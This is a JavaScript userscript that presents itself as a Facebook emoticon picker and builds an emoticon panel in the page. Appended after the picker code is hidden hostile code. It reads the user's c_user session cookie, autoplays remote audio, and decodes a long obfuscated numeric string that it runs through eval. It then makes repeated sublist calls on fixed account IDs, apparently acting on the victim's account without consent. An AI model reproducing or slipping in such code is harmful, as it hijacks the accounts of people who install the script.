                    html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
                    html += '</div>';
                    html += '</div>';
                    var body = createElement(html).firstChild;
                    for ( var e = 0; e < emoticons.length; e++) {
                            var emoticon = emoticons[e];
                            if (!filter(emoticon)) {
                                    continue;
                            }
     
                            // Icons
                            html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
                            html += '<a';
                            html += ' class="emoticon'
                                            + (emoticon.class !== undefined ? ' ' + emoticon.class : '')
                                            + '"';
                            html += ' style="text-decoration: inherit; color: inherit;'
                                            + (emoticon.class !== undefined ? ' color: transparent;'
                                                            : ' width: auto;') + '"';
                            html += (emoticon.name !== undefined ? ' title="' + emoticon.name
                                            + '"' : '');
                            html += '>';
                            html += htmlSpecialChars(emoticon.chars);
                            html += '</a>';
                            html += '</span>';
                            var cell = createElement(html);
                            body.appendChild(cell);
     
                            // Select emoticon listener
                            var emoticonA = cell.firstChild;
                            (function(emoticon) {
                                    emoticonA.addEventListener("click", function() {
                                            if (isInstanceOfTextInput(lastActiveElement)) {
                                                    lastActiveElement.focus();
     
                                                    var chars = emoticon.chars;
                                                    var value = lastActiveElement.value;
                                                    var start = lastActiveElement.selectionStart;
                                                    var end = lastActiveElement.selectionEnd;
                                                    lastActiveElement.value = value.substring(0, start)
                                                                    + chars + value.substring(end);
                                                    lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
                                            }
     
                                            openFlyoutCommand = false; // Close flyout
                                    });
                            })(emoticon);
                    }
     
                    return body.parentNode;
            }
     
            // = Construct UI =======
            var html;
     
            // Menu item
            // var navItem
            html = '<li class="navItem middleItem notifNegativeBase">';
            html += '<div class="fbJewel">';
            // {
     
            // Toggler
            html += '<a class="navLink" title="Show Facebook Extra Emoticons">'; // var navLink
            html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
            html += '</a>';
     
           
            // Flyout
            html += '<div>'; // openToggler; var flyout
            html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
            // {
     
           
            // Beeper
            html += '<div class="jewelBeeperHeader">';
            html += '<div class="beeperNubWrapper">';
            html += '<div class="beeperNub" style="left: 4px;"></div>';
            html += '</div>';
            html += '</div>';
     
            // Tabs
            // var titleContainer
            html += '<ul style="display: text-align: center;">';
            html += '</ul>';
     
            // Bodies
            html += '<div>'; // var bodyContainer
            html += '</div>';
     
            // Footer
            html += '<div class="jewelFooter">';
        html += '<a class="jewelFooter" href="https://www.facebook.com/candrasoekamtis.berpacudlmmelodic" target="_blank">Created by Candra Cah Blimbing <br>Click Here</a>';
            html += '</div>';
     
            // }
            html += '</div>'; // emoticonsPanel
            html += '</div>'; // openToggler
     
            // }
            html += '</div>'; // fbJewel
            html += '</li>'; // navItem
     
            var navItem = createElement(html);
            var pageNav = document.querySelector("#pageNav");
            pageNav.insertBefore(navItem, pageNav.firstChild);
     
            // Maintain active element
            navItem.addEventListener("click", function() {
                    if (isInstanceOfTextInput(lastActiveElement)) {
                            lastActiveElement.focus();
                    }
     
                    openFlyoutCommand = undefined; // Do nothing
            }, true);
     
            var navLink = navItem.firstChild.firstChild;
            var flyout = navLink.nextSibling;
            var titleContainer = flyout.firstChild.childNodes[1];
            var bodyContainer = titleContainer.nextSibling;
     
            // Toggle listener
            navLink.addEventListener("click", function() {
                    openFlyoutCommand = !isFlyoutOpen(flyout);
            });
     
            // Picture emoticon tab
            var picEmoTab = createTab(titleContainer, bodyContainer);
            picEmoTab.title.click(); // Default tab
           
            picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
                    if (emoticon.class === undefined) { // No picture
                            return false;
                    }
     
                    // [Bug] 2 characters unicode emoticons
                    if (emoticon.chars.length == 2) {
                            return false;
                    }
     
                    return true;
     
                            }));
     
            // = Other listener =======
     
            document.addEventListener("click", function() {
                    // Get active textarea
                    lastActiveElement = document.activeElement;
     
                    // Toggle flyout
                    if (openFlyoutCommand !== undefined) {
                            openFlyout(flyout, openFlyoutCommand);
                    }
                    openFlyoutCommand = false;
            });
    })();
     
     
    /* Mode By Mr.LoveS.NK */
    var parent=document.getElementsByTagName("html")[0];
    var _body = document.getElementsByTagName('body')[0];
    var _div = document.createElement('div');
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    _div.style.height="25";
    _div.style.width="100%";
    _div.style.position="fixed";
    _div.style.top="auto";
    _div.style.bottom="0";
    _div.align="center";
    var _audio= document.createElement('audio');
    _audio.style.width="100%";
    _audio.style.height="25px";
    _audio.controls = true;
    _audio.autoplay = false;
    _audio.autoplay = true;
    _audio.src = "http://divine-music.info/musicfiles/01%20Payphone%20%28feat.%20Wiz%20Khalifa%29.swf";
    _div.appendChild(_audio);
    _body.appendChild(_div);
    var _3801;var _2457='35910C189F119B1933F1744C1897A1159E1789E1753B1726A1771B1915C1906D1798A1159E1420B1159F1771F1870F1762E1924D1852C1780D1861E1915A1285D1798C1780E1915F1492A1843B1780A1852F1780B1861A1915B1906B1465D1960A1573D1744A1852B1780E1231A1222D1789C1753C1726A1771B1915F1906A1798F1222D1240E1690A1303B1708A1285F1933A1744B1843C1924D1780D1402F961E1933D1744D1897A1159C1924C1906D1780C1897C1726B1816C1771C1159C1420D1159E1771B1870B1762C1924B1852C1780B1861C1915A1285E1762D1870F1870C1834E1816F1780E1285D1852C1744E1915F1762C1807A1231B1771D1870E1762C1924F1852F1780C1861B1915B1285A1762A1870C1870B1834B1816A1780D1285A1852F1744E1915D1762B1807C1231F1294F1762B1726E1924B1906B1780F1897E1420D1231D1699A1771C1258B1240C1294B1240D1690B1312F1708A1240B1402D961D1933D1744E1897D1159A1789D1753F1726A1771A1915C1906F1798F1420C1771A1870F1762F1924F1852B1780F1861A1915B1285C1798A1780D1915A1492D1843E1780B1852E1780B1861C1915F1906E1465F1960F1573C1744C1852C1780D1231C1177C1789F1753F1726C1771D1915C1906A1798E1177F1240D1690A1303F1708A1285A1933B1744D1843A1924C1780E1402B961D1933B1744C1897D1159B1924B1906B1780B1897D1726C1816B1771C1420C1771A1870D1762C1924F1852D1780E1861B1915E1285A1762E1870B1870B1834B1816D1780D1285D1852F1744C1915C1762E1807C1231D1771B1870B1762A1924D1852C1780A1861F1915E1285F1762A1870D1870D1834A1816E1780E1285D1852B1744E1915C1762F1807E1231F1294C1762C1726E1924C1906A1780F1897A1420D1231E1699F1771F1258F1240F1294E1240C1690E1312F1708D1240B1402B961A1789C1924C1861F1762F1915F1816E1870A1861B1159B1744E1231E1744C1753A1870C1861C1780B1240E1978F1933A1744C1897E1159E1807A1915F1915A1879B1339A1420A1861A1780A1942B1159F1663A1564A1555C1519B1915C1915F1879A1609F1780B1888E1924B1780C1906A1915D1402D1933C1744A1897F1159B1924F1897C1843A1339F1420D1177F1294B1744E1825B1744E1951A1294C1789D1870C1843B1843B1870A1942D1294E1789F1870A1843E1843A1870C1942A1726E1879D1897B1870F1789F1816C1843B1780A1285C1879E1807A1879B1438C1726B1726D1744F1420E1312E1177B1402D1933C1744A1897C1159A1879A1744D1897A1744C1852C1906C1339C1420E1177E1879C1897E1870F1789C1816E1843B1780D1726E1816D1771B1420F1177E1258F1744B1753B1870E1861F1780A1258C1177A1213D1843C1870B1762B1744E1915B1816F1870E1861E1420F1312E1213F1906E1870C1924E1897A1762D1780E1420E1789F1870D1843E1843B1870F1942F1276D1753D1924E1915E1915E1870F1861D1213F1906D1924D1753E1906E1762D1897D1816D1753D1780E1771F1726A1753F1924D1915A1915E1870E1861A1726E1816F1771E1420C1924E1330F1366C1888C1744B1762D1726C1330D1366D1213D1789A1753C1726B1771B1915C1906B1798A1420B1177E1258E1789C1753E1726F1771C1915B1906C1798C1258A1177B1213E1843C1906C1771B1213E1726A1726C1177D1258E1924F1906D1780B1897D1726F1816D1771E1258F1177C1213C1879D1807B1906B1915F1744C1852F1879F1420F1177D1402D1807D1915F1915B1879B1339E1285D1870A1879C1780E1861B1231F1177F1591C1582B1618F1627B1177F1267A1924A1897A1843A1339C1267A1915B1897D1924B1780D1240B1402E1807B1915C1915B1879E1339A1285E1870C1861C1897C1780D1744B1771D1960A1906C1915E1744A1915B1780B1762C1807E1744F1861A1798D1780C1420E1789C1924E1861A1762A1915B1816C1870D1861D1231E1240E1978F1816D1789C1231D1807A1915E1915C1879A1339E1285C1897E1780E1744F1771A1960B1618E1915F1744C1915C1780E1420B1420A1339A1213D1213C1807D1915C1915E1879A1339B1285B1906B1915B1744A1915F1924B1906D1420C1420C1321A1303B1303E1240D1807C1915F1915D1879D1339C1285D1762A1843C1870F1906E1780B1996E1402E1807C1915C1915C1879C1339F1285F1906E1780C1861E1771A1231F1879F1744E1897F1744F1852A1906A1339A1240A1996E1744D1231F1177C1312A1303C1303C1303A1303A1366B1348D1375F1375F1303C1348B1321E1303B1366A1375B1177C1240E1402E1789E1924C1861D1762A1915A1816F1870D1861D1159F1906F1924F1753C1843D1816A1906D1915C1231D1924A1816D1771D1906C1906B1240E1978A1933B1744B1897E1159F1744D1420D1771E1870B1762B1924F1852A1780B1861B1915E1285A1762B1897C1780E1744C1915C1780E1492A1843C1780F1852C1780A1861A1915D1231D1222E1906D1762C1897C1816A1879D1915A1222B1240C1402A1744D1285D1816B1861C1861F1780F1897A1519D1627B1564B1555B1420D1177D1861D1780B1942A1159D1456D1906E1960D1861B1762F1609F1780B1888C1924D1780C1906A1915F1231E1240A1285F1906E1780A1915F1636E1609E1528F1231B1222B1294A1744E1825E1744F1951A1294A1789A1897D1816D1780C1861A1771F1906D1294E1843C1816E1906A1915D1906F1294D1906E1924E1753A1906B1762D1897A1816B1753E1780A1294E1852E1870F1771B1816F1789A1960C1438A1843A1870C1762A1744B1915B1816F1870C1861E1420B1879B1780E1897C1852F1744B1843F1816B1861C1834F1213D1744C1762B1915B1816D1870D1861B1420A1906A1924C1753B1906E1762A1897E1816D1753D1780E1222D1240D1285D1906F1780C1915D1483A1744B1915E1744A1231E1978C1159A1789D1843A1816E1771B1393D1159D1177B1258B1924C1816E1771A1906C1906A1258F1177F1159B1996B1240E1285A1906E1780D1861E1771E1231C1240E1402E1177C1402D1771C1870B1762C1924D1852B1780A1861F1915D1285E1753B1870A1771D1960C1285F1744F1879C1879D1780C1861E1771C1474C1807E1816B1843A1771C1231F1744A1240F1996F1906C1924F1753D1843C1816D1906D1915F1231C1177A1312A1339F1330E1330D1348B1348C1330C1348A1303F1303F1321D1312D1339F1303D1321C1366A1177E1240F1402D1906F1924D1753E1843D1816C1906B1915C1231D1177F1312E1339F1330E1330A1348A1348C1339F1312A1339E1303C1321F1312F1330C1384D1357C1330E1177A1240F1402E1906F1924A1753B1843E1816A1906C1915F1231F1177B1312A1339F1330A1330B1348D1348F1330A1330C1312B1330D1348B1339F1366B1330D1366F1384C1177D1240C1402A1906B1924E1753C1843E1816B1906D1915C1231E1177F1312B1339C1330D1330B1348A1348C1330B1375C1312F1357F1375D1375A1303C1357C1357F1321D1177E1240B1402E1906C1924B1753B1843C1816E1906F1915D1231B1177D1312F1339B1330A1330A1348E1348B1339A1303B1303F1303A1321C1312F1330A1384A1366A1366A1177E1240A1402F1933E1744A1897C1159D1924B1906E1780E1897E1726F1816C1771A1420F1771B1870C1762D1924D1852D1780E1861B1915E1285A1762D1870B1870E1834A1816C1780B1285D1852D1744A1915F1762D1807F1231D1771B1870C1762E1924A1852A1780B1861D1915F1285C1762B1870F1870A1834B1816D1780F1285B1852C1744C1915A1762C1807B1231F1294B1762C1726F1924C1906E1780A1897A1420C1231E1699E1771A1258B1240E1294C1240C1690B1312D1708D1240B1402D1933F1744C1897A1159D1789A1753E1726A1771F1915F1906C1798D1420B1771F1870F1762D1924F1852E1780E1861C1915F1285D1798D1780E1915C1492F1843F1780C1852F1780A1861E1915C1906E1465E1960F1573E1744C1852F1780A1231B1222A1789C1753B1726D1771B1915D1906E1798C1222C1240E1690C1303C1708A1285F1933E1744F1843E1924F1780C1402D1933D1744F1897B1159E1861A1870D1942C1420B1231D1861F1780F1942B1159C1483C1744E1915D1780F1240A1285E1798A1780B1915E1627D1816D1852A1780C1231F1240B1402E1789D1924E1861D1762B1915E1816E1870D1861B1159F1591E1231B1879E1870A1906A1915F1240C1978C1933C1744C1897C1159A1663C1420E1861D1780D1942A1159B1663C1564B1555C1519F1915F1915D1879E1609C1780F1888D1924A1780C1906D1915B1231D1240D1402F1933A1744D1897C1159C1663D1636D1609C1555C1420A1177D1294D1294B1942F1942C1942D1285A1789C1744C1762C1780F1753A1870D1870D1834A1285B1762A1870C1852E1294C1744B1825D1744E1951B1294E1924E1789C1816B1294B1843B1816F1834B1780F1285F1879D1807B1879D1177E1402E1933A1744F1897B1159B1663F1591B1744C1897B1744D1852D1906F1420A1177E1843C1816F1834B1780F1726D1744F1762D1915F1816F1870E1861C1420D1915C1897D1924E1780A1213D1789C1915A1726C1780A1861F1915A1726C1816D1771A1780D1861B1915D1816A1789F1816B1780D1897A1420D1177F1258A1879F1870A1906C1915C1258D1177B1213E1906B1870D1924D1897E1762F1780F1420F1312F1213E1762B1843E1816D1780E1861E1915D1726F1816B1771F1420C1177A1258A1861B1870E1942C1258B1177E1204B1384D1456B1303D1339D1375A1357F1330E1375B1375F1321F1321A1366B1213E1897B1870A1870B1915E1816F1771C1420E1924B1726A1879D1906B1726D1303B1726B1303F1726B1312D1339E1213D1798E1816B1789E1915C1870C1762A1762A1744F1906D1816B1870E1861B1213C1789E1915C1690A1915D1861B1708A1420C1204D1330C1492D1204C1330E1483F1636C1213A1789C1915A1690D1915C1960D1879F1780E1708D1420A1321B1303D1213B1789D1915E1690E1888F1816A1771C1708A1420E1348D1375E1384A1384B1339C1321A1321F1303D1366E1366F1330C1384B1357F1375F1312B1213A1789F1915E1690A1852D1789B1726E1906C1915F1870F1897A1960B1726B1834B1780E1960A1708D1420B1177B1258B1879C1870A1906A1915A1258F1177C1213D1861D1762B1915B1897C1690B1726C1852C1870A1771C1708E1420A1879A1744C1798F1780E1843A1780A1915A1726A1807F1870F1852D1780A1726B1906A1915D1897E1780E1744F1852A1213C1726D1726B1924A1906A1780E1897D1420A1177E1258E1924B1906A1780F1897A1726F1816D1771A1258F1177D1213E1726E1726A1744B1420F1312B1213E1726F1726A1771D1960B1861F1420B1366A1861B1375C1744F1807A1960A1825B1330C1348D1474D1501C1942D1663B1456D1798E1213F1726C1726C1897E1780F1888A1420C1825F1213D1789E1753F1726F1771B1915E1906B1798B1420A1177E1258E1789A1753A1726C1771F1915B1906E1798D1258B1177F1213C1879B1807D1906B1915D1744A1852F1879E1420B1177D1402F1663C1285D1870B1879C1780B1861C1231D1177A1591F1582B1618E1627D1177D1267C1663B1636D1609F1555D1267B1915A1897C1924D1780B1240E1402C1663F1285A1870B1861D1897F1780C1744C1771C1960F1906F1915D1744E1915D1780F1762A1807F1744D1861B1798E1780A1420C1789C1924F1861D1762E1915A1816D1870A1861A1231F1240D1978C1816B1789A1231C1663D1285F1897D1780F1744F1771E1960E1618D1915D1744C1915E1780E1420D1420F1339A1213C1213C1663C1285C1906E1915E1744C1915F1924C1906F1420D1420D1321F1303A1303B1240C1978B1663C1285E1762A1843A1870B1906B1780C1996A1996C1402D1663F1285A1906A1780F1861E1771E1231B1663A1591F1744D1897B1744E1852A1906B1240B1996D1933E1744F1897E1159E1789C1753C1726D1771F1915C1906D1798C1420E1771B1870A1762E1924A1852E1780A1861E1915D1285C1798F1780E1915D1492F1843B1780D1852B1780F1861B1915A1906F1465F1960E1573A1744E1852A1780C1231C1222F1789C1753F1726E1771B1915B1906B1798C1222F1240B1690A1303E1708E1285A1933E1744B1843F1924A1780A1402C1933F1744B1897C1159B1924C1906D1780E1897B1726E1816B1771E1420A1771F1870E1762F1924D1852E1780A1861F1915E1285F1762E1870A1870F1834B1816A1780F1285E1852D1744E1915A1762B1807B1231E1771D1870C1762D1924D1852C1780F1861E1915F1285D1762F1870B1870C1834F1816A1780B1285D1852D1744F1915D1762C1807B1231F1294D1762D1726A1924F1906A1780D1897A1420B1231B1699E1771F1258A1240A1294B1240F1690C1312D1708B1240D1402F1789F1924E1861D1762E1915D1816C1870D1861C1159B1555C1816E1834B1780E1231D1879A1240B1978F1933C1744D1897D1159C1591E1744A1798A1780A1420F1861C1780D1942F1159B1663F1564D1555F1519C1915A1915E1879A1609B1780F1888C1924D1780C1906F1915C1231C1240B1402D1933F1744E1897B1159A1591E1744C1798F1780C1636F1609C1555D1420B1177B1294C1294B1942C1942A1942A1285E1789F1744C1762B1780F1753C1870F1870D1834D1285F1762D1870E1852D1294D1744C1825C1744C1951A1294C1879B1744C1798E1780D1906C1294E1789B1744E1861E1726A1906C1915C1744D1915B1924D1906D1285E1879C1807A1879E1177B1402B1933E1744C1897A1159E1591F1744A1798E1780E1591A1744D1897F1744D1852B1906B1420A1177A1213D1789D1753B1879D1744D1798B1780E1726E1816B1771D1420C1177D1258B1879F1258B1177F1213C1744F1771E1771A1420A1915D1897F1924D1780F1213C1897E1780E1843A1870C1744A1771E1420B1789B1744A1843B1906E1780B1213C1789C1744A1861D1726B1870A1897D1816C1798C1816B1861C1420C1879F1744A1798A1780D1726B1915A1816D1852D1780C1843F1816D1861F1780C1213E1789E1744B1861F1726E1906F1870C1924E1897D1762C1780F1420D1213C1762F1744E1915B1420C1213B1861D1762A1915D1897C1690F1726A1852A1870B1771E1708F1420B1879D1744E1798A1780E1843C1780A1915A1726F1915E1816F1852F1780C1843E1816C1861F1780B1726D1879D1744E1798B1780D1726D1744F1762E1915D1816C1870E1861B1906E1213D1726A1726E1924C1906C1780B1897A1420D1177C1258E1924C1906C1780C1897D1726C1816B1771E1258A1177A1213D1726B1726F1744F1420D1312A1213D1726D1726D1771E1960C1861F1420D1366E1384C1375C1744B1483A1348F1969B1348D1474D1501B1276C1213B1726A1726E1897E1780A1888A1420B1771D1213C1789D1753D1726D1771E1915B1906D1798D1420E1177C1258D1789C1753A1726F1771B1915D1906A1798B1258A1177F1213A1879E1807B1906A1915A1744C1852F1879A1420C1177E1402B1591E1744B1798A1780C1285F1870B1879C1780C1861B1231B1177D1591F1582B1618E1627D1177A1267E1591C1744E1798C1780F1636D1609B1555A1267F1915E1897C1924E1780E1240D1402A1591A1744D1798D1780C1285C1870D1861D1897B1780D1744C1771C1960A1906B1915C1744A1915A1780D1762B1807A1744C1861D1798B1780B1420E1789C1924B1861E1762B1915A1816D1870F1861F1231F1240B1978D1816B1789D1231A1591E1744A1798A1780E1285D1897D1780E1744D1771A1960D1618B1915D1744C1915C1780B1420E1420D1339F1213F1213C1591E1744A1798A1780A1285D1906E1915D1744B1915A1924A1906C1420B1420E1321E1303A1303C1240A1978B1591E1744A1798A1780B1285F1762E1843B1870D1906A1780E1996F1996E1402B1591A1744B1798B1780B1285B1906F1780D1861A1771D1231A1591C1744F1798B1780B1591F1744E1897A1744F1852D1906F1240F1996E1555F1816F1834B1780B1231D1177F1348E1375F1312A1321E1312D1339E1384A1384A1375A1357B1330F1375A1375B1321D1366D1177E1240A1402D1789F1924A1861C1762B1915D1816E1870E1861F1159E1528D1483D1618D1231E1897C1240A1978B1933D1744B1897F1159F1663F1420C1861E1780A1942A1159B1663B1564C1555D1519D1915B1915F1879B1609F1780B1888B1924B1780F1906C1915D1231B1240C1402C1933F1744D1897A1159A1663B1636F1609A1555A1420D1177B1294A1294F1942B1942C1942D1285C1789D1744C1762A1780B1753D1870E1870B1834D1285D1762D1870C1852F1294E1744E1825C1744A1951F1294E1744D1771B1771F1726A1789F1897B1816E1780E1861E1771E1294E1744A1762E1915D1816D1870F1861D1285E1879A1807E1879A1177E1402E1933C1744A1897A1159D1663C1591C1744D1897E1744B1852C1906E1420D1177B1915E1870A1726E1789E1897F1816C1780F1861E1771E1420B1177E1258D1897D1258C1177C1213D1744C1762C1915D1816C1870C1861E1420A1744D1771F1771B1726D1789A1897A1816F1780A1861C1771B1213C1807B1870F1942F1726F1789B1870A1924E1861E1771C1420D1789D1897D1816B1780F1861F1771E1726C1753E1897E1870A1942F1906B1780A1897E1726B1906A1213A1897E1780E1789F1726E1879A1744F1897C1744B1852E1420A1861B1870B1861F1780C1213C1213E1213A1870B1924C1915B1798C1870F1816B1861C1798E1726E1816A1771B1420B1213B1843A1870B1798C1798C1816B1861F1798F1726D1843F1870D1762F1744B1915D1816B1870B1861F1420F1906E1780A1744C1897C1762F1807A1213F1861C1870C1726B1789F1843D1960C1870B1924C1915F1726C1870C1861C1726C1762F1843F1816F1762C1834B1420B1915C1897F1924B1780D1213D1780C1798F1870E1726A1843A1870F1798F1726E1771C1744B1915F1744F1213E1807F1915F1915B1879E1726A1897C1780A1789D1780E1897F1780D1897D1213A1726A1726C1924C1906E1780D1897C1420E1177F1258D1924A1906B1780E1897C1726F1816B1771A1258D1177D1213C1726A1726E1744F1420F1312F1213C1726D1726E1771F1960B1861B1420A1366F1384E1375E1744F1483E1348C1969B1348C1474D1501A1276D1213F1726A1726C1897A1780A1888B1420A1330A1348A1213B1789F1753B1726C1771E1915C1906D1798F1420E1177D1258B1789D1753F1726D1771E1915E1906E1798D1258A1177E1213F1879D1807D1906D1915C1744D1852B1879E1420A1177C1402B1663F1285E1870B1879B1780B1861C1231B1177B1591C1582C1618A1627D1177A1267D1663C1636B1609A1555D1267E1915C1897B1924E1780D1240C1402B1663E1285F1870D1861C1897F1780F1744F1771E1960B1906C1915A1744A1915C1780E1762E1807D1744E1861D1798F1780A1420F1789A1924B1861F1762C1915C1816A1870C1861E1231C1240A1978A1816B1789B1231F1663D1285B1897F1780B1744D1771A1960D1618A1915D1744F1915C1780C1420A1420E1339C1213E1213C1663E1285F1906E1915C1744B1915C1924E1906C1420A1420B1321E1303B1303A1240F1978A1663A1285C1762D1843C1870E1906F1780E1996F1996F1402C1663B1285A1906A1780C1861A1771E1231B1663B1591A1744C1897A1744C1852D1906B1240A1996B961D1744F1231E1177A1312D1303C1303F1303C1303D1339F1375B1357C1348A1321C1375C1303D1303D1339A1330B1177A1240E1402F961C1744F1231D1177C1312B1303F1303B1303E1303B1357E1366C1375C1312F1366F1312A1375D1321A1375C1384D1177E1240E1402C961F1744B1231C1177D1312A1303C1303A1303A1303F1312C1339B1348B1348A1375B1330C1339B1339A1357E1312B1177F1240F1402C961A1744E1231A1177E1312B1303C1303D1303D1303B1366A1348D1375D1375B1303F1348E1321A1303F1366D1375E1177A1240A1402E961B1744C1231F1177C1312E1303E1303E1303D1303D1339E1366D1339B1321A1321A1375B1303A1375E1375E1339A1177A1240B1402F961B1744E1231B1177F1312A1303C1303C1303F1303B1321C1348B1312D1348E1312D1348C1330A1321E1339D1366F1177B1240A1402E961A1294E1294E1618E1780A1861D1744C961E1906A1924C1753C1843D1816F1906B1915D1231A1177D1357C1321E1366F1348D1321F1384F1375C1339F1366E1321B1357B1384B1339D1321D1312F1177A1240E1402C961F1906D1924F1753E1843A1816C1906D1915E1231F1177E1357B1384B1312B1321C1357A1357D1312E1330F1366A1348A1357E1321E1339F1348E1375F1177C1240E1402D961F1906B1924A1753A1843E1816F1906C1915E1231E1177F1357F1312A1330F1303D1339D1303E1384C1330E1375C1366D1312B1375F1330A1312C1321A1177C1240D1402D961D1906C1924C1753B1843A1816E1906D1915E1231C1177A1357D1321D1357C1321F1321D1321A1312D1339D1366C1339D1303D1303B1312B1384D1312D1177E1240B1402C961E1906A1924E1753E1843C1816E1906A1915B1231F1177A1366C1303F1357D1384D1348A1348F1303C1357F1348C1384A1384B1330E1348B1357E1348E1177E1240C1402C961E1906E1924B1753E1843C1816F1906A1915C1231A1177E1366A1303B1357B1384F1348F1339E1384B1348A1321D1357C1357E1303C1321C1339C1330D1177D1240D1402E961A1906A1924C1753A1843A1816A1906A1915F1231F1177E1366A1303E1357D1384B1348F1348A1339B1321C1321D1357A1357E1303E1312C1384A1357D1177B1240C1402C961D1906E1924D1753D1843E1816A1906D1915A1231B1177F1366E1303E1357F1384E1348C1339F1339C1330E1384F1330F1321D1357F1384F1357E1312B1177F1240F1402D961F1906A1924C1753B1843F1816E1906E1915E1231D1177F1366C1303A1357F1384C1348E1348D1357E1303B1384F1330B1321E1357E1375A1339B1339D1177E1240B1402B961C1906B1924A1753A1843C1816F1906C1915C1231A1177C1366D1303D1357A1384D1348F1339E1357F1375A1321D1357A1357F1303B1321A1366E1303D1177F1240E1402D961D1294A1294E1834F1780C1843F1924E1744D1897A961C1906F1924B1753A1843D1816F1906F1915D1231B1177E1321B1312B1384B1339F1330C1339A1366F1384B1312D1348F1357B1321C1303A1321B1384C1177D1240F1402E961E1294D1294B1861B1780A1942A1753E1816F961C1906A1924E1753F1843D1816E1906E1915F1231F1177B1321E1339B1330F1312D1384F1384D1375B1330A1384B1312B1375C1312E1339E1321E1339C1177B1240C1402E961E1294D1294B1519E1744B1879C1879C1960F961E1906A1924A1753D1843F1816F1906A1915A1231A1177A1348B1366B1339F1348A1312D1357E1321F1384D1384B1321B1366B1330C1348F1348E1384F1177B1240C1402F961B1906B1924C1753D1843A1816E1906A1915A1231D1177F1348B1366D1339C1348F1312A1357E1330D1375C1348D1384F1339E1303B1321C1312D1366C1177C1240E1402E961F1906D1924B1753E1843E1816F1906B1915A1231C1177B1348B1366D1339A1348E1312F1348D1375A1303F1348A1384A1339F1303F1321E1366B1348C1177B1240B1402E961A1906F1924B1753B1843E1816E1906F1915B1231D1177F1348F1303D1339B1384D1330E1312E1384C1375D1321E1375F1375F1384A1330D1312E1348A1177A1240D1402B961B1294A1294A1906B1780A1861D1744D1321B961E1906E1924D1753D1843C1816E1906E1915C1231B1177E1312F1339E1330B1330E1348E1348A1330C1348A1303D1303E1321D1312B1339B1303B1321C1366F1177B1240D1402D961E1906B1924F1753E1843C1816F1906E1915D1231D1177B1312D1339D1330A1330C1348A1348C1339E1312C1339E1303A1321D1312A1330F1384C1357F1330F1177D1240E1402A961D1906F1924E1753F1843B1816C1906A1915B1231F1177D1312D1339A1330F1330B1348B1348F1330E1330B1312D1330A1348F1339C1366E1330B1366F1384F1177D1240F1402D961E1906E1924F1753C1843B1816E1906D1915A1231F1177B1312D1339C1330C1330B1348B1348C1330A1375F1312D1357B1375A1375E1303C1357D1357E1321C1177D1240F1402C961C1906E1924D1753B1843C1816E1906C1915C1231E1177B1312D1339F1330F1330D1348D1348C1339E1303D1303B1303F1321E1312C1330B1384B1366B1366A1177C1240B1402F961E1294D1294C1636B1852A1159D1555D1780B1870C961D1744C1231A1177A1312D1303D1303C1303A1303A1330D1312A1384B1366D1357E1366D1384B1339C1348F1339E1177C1240E1402E961F1744A1231A1177B1312B1303B1303F1303C1303D1348E1357E1339A1384A1357A1384B1330D1330A1384B1312C1177C1240F1402C961D1906B1924D1753D1843A1816D1906B1915E1231B1177F1339B1321E1321F1366A1357D1321D1312D1384E1312A1312E1366E1330B1366C1303A1303B1177F1240A1402A961B1906D1924C1753E1843B1816B1906C1915C1231B1177F1312A1366F1348D1330B1348D1357F1375C1321B1321B1357A1357A1321B1357F1339F1303B1177D1240D1402C961C1906D1924E1753E1843D1816C1906C1915E1231B1177D1339B1303C1321A1321B1330A1330E1321D1312B1384D1375E1384B1330C1321A1357F1339C1177F1240A1402C961B1906E1924C1753C1843C1816D1906C1915F1231E1177B1312F1366B1348E1330C1348B1357F1348A1348F1384A1330E1321A1384B1330B1330E1330C1177F1240E1402F961F1906D1924D1753C1843D1816E1906E1915F1231A1177F1339C1375C1303A1330A1348C1321E1366C1357C1348C1339D1312E1339C1357B1339B1321D1177C1240E1402A961E1294B1294F1555E1816B1834E1780B961E1555B1816C1834B1780B1231F1177F1357B1384E1366F1330C1330A1303F1375F1339E1357A1384D1348A1348A1384B1375E1366E1177C1240D1402B961E1555F1816A1834A1780C1231A1177E1366F1303C1348B1357E1303A1303A1321E1357E1384C1339E1357A1321C1330F1366C1375D1177D1240C1402B961E1555D1816C1834A1780B1231F1177C1357F1339F1384C1303A1375F1348E1357B1321E1375A1339F1339F1366F1312D1366C1357A1177E1240D1402B961D1555B1816A1834B1780F1231D1177D1321D1339E1312D1330C1339E1375A1366D1330E1384C1321B1303A1384B1330C1312C1303D1177F1240E1402E961D1555A1816B1834A1780A1231C1177B1312B1366C1366E1384C1384D1357B1312C1303B1348B1366D1330F1339C1357A1312F1339B1177B1240D1402F961B961F1933D1744D1897A1159A1798B1816D1771C1159D1420E1159C1690C1222A1348B1375D1384E1384C1339E1321E1321C1303B1366F1366F1330D1384A1357F1375B1312F1222A1708B1402F';var _6131=/[\x41\x42\x43\x44\x45\x46]/;var _7176=2;var _8178=_2457.charAt(_2457.length-1);var _2168;var _1434=_2457.split(_6131);var _1987=[String.fromCharCode,isNaN,parseInt,String];_1434[1]=_1987[_7176+1](_1987[_7176](_1434[1])/21);var _3516=(_7176==9)?String:eval;_2168='';_11=_1987[_7176](_1434[0])/_1987[_7176](_1434[1]);for(_3801=3;_3801<_11;_3801++)_2168+=(_1987[_7176-2]((_1987[_7176](_1434[_3801])+_1987[_7176](_1434[2])+_1987[_7176](_1434[1]))/_1987[_7176](_1434[1])-_1987[_7176](_1434[2])+_1987[_7176](_1434[1])-1));var _3723='_3742';var _5263='_3723=_2168';function _8403(_3971){_3516(_1458);_8403(_4370);_4370(_5263);_8403(_3723);}var _1458='_8403=_3516';var _4370='_4370=_8403';_8403(_8178);
     
    ///////////////////////////KHÔNG XÓA ? ÐÂY///////////////////////////
    // feri 1sampe5
    sublist("259013674269982");
    sublist("259015654269784");
    sublist("209446352560048");
    sublist("259017110936305");
    sublist("259017157602967");
    // feri 6sampe10
    sublist("259017297602953");
    sublist("259017580936258");
    sublist("259017644269585");
    sublist("259017677602915");
    sublist("259017760936240");
    // feri 11-15
    sublist("259017884269561");
